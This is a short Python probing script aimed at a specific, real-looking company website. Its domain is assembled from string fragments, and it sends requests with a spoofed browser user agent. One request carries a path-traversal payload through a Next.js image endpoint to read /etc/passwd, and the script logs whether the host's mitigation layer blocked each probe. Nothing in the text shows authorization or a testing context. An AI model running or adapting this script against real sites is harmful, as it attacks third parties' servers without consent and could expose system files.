import requests
UA="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
B = "https://" + "www.infinity" + "capital" + ".bh"
s=requests.Session(); s.headers.update({"User-Agent":UA,"Accept":"*/*"})
paths=["/","/contact","/api/send","/_next/image?url=%2F..%2F..%2Fetc%2Fpasswd&w=100","/api/","/404","/atom.xml","/contact?cb=1","/?page=2"]
for p in paths:
    try:
        r=s.get(B+p,timeout=20,allow_redirects=False)
        print(p,"->",r.status_code,len(r.content),r.headers.get("x-vercel-mitigated"),r.headers.get("content-type"))
    except Exception as e:
        print(p,"EXC",e)
